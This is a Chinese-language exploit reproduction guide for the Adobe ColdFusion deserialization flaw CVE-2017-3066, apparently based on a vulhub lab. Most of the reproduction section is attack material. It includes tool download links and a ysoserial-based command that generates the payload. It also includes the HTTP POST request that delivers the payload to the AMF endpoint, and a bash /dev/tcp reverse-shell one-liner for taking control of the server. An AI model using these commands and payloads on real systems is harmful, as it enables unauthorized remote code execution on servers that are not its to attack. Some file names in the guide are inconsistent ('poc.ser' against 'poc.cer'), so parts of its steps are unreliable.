# （CVE-2017-3066）Adobe ColdFusion 反序列化漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2806](https://www.zhihuifly.com/t/topic/2806)

# （CVE-2017-3066）Adobe ColdFusion 反序列化漏洞

## 一、漏洞简介

## 二、漏洞影响

Adobe ColdFusion (2016 release) Update 3及之前的版本，

ColdFusion 11 Update 11及之前的版本，

ColdFusion 10 Update 22及之前的版本。

## 三、复现过程

使用[ColdFusionPwn](https://github.com/ianxtianxt/ColdFusionPwnn)工具来生成POC。
[点击下载ColdFusionPwn](http://wiki.0-sec.org/download/ColdFusionPwn-0.0.1-SNAPSHOT-all.zip)

> ## Usage
> 
> ```
> java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner [-s|-e] [payload type] '[command]' [outfile] 
> ```

[点击下载ysoserial](http://wiki.0-sec.org/download/ysoserial.zip)
【注意】下载的jar包可能因为时间不同，而更新，包名也就不同。注意将命令中的包名，替换为你下载时候的名字

```
java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/CVE-2017-3066_is_success' poc.ser 
```

生成poc.ser文件后，将POC作为数据包body发送给`http://your-ip:8500/flex2gateway/amf`，Content-Type为`application/x-amf`

```
POST /flex2gateway/amf HTTP/1.1
Host: your-ip:8500
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-amf
Content-Length: 2853 `[…poc…]` 
```

![image](img/68b10682ce9913b874ca871a4bd0fb7b.png)

### 关于发送的内容编码问题

由于编码问题，如果直接从Notepad++/Notepad里面复制粘贴为body部分，是不成功的，即使返回的状态码是200

#### 正确发送方式为：

右击选择**Paste From File**，上传**poc.cer**文件

![image](img/3ef0eb4513a853e0c2d867f392ed278b.png)

再到`Raw`界面添加HTTP头部，如果成功，并且打算以后还需要用的话，右击选择`Copy to File`保存

![image](img/07535ef03fe57b7689af3d0a04398d60.png)

进入容器中，发现`/tmp/success`已成功创建：

![image](img/a2fe6db61dd13cf1681615fb0cde6b83.png)

将POC改成[反弹命令](http://www.jackson-t.ca/runtime-exec-payloads.html)，成功拿到shell：

![image](img/36bef43c7be4531bf8ad9b225bfb987e.png)

补充一下反弹shell的命令,可以通过http://www.jackson-t.ca/runtime-exec-payloads.html在线转换

```
bash -i >& /dev/tcp/ip/port 0>&1 
```

## 参考链接

> https://vulhub.org/#/environments/coldfusion/CVE-2017-3066/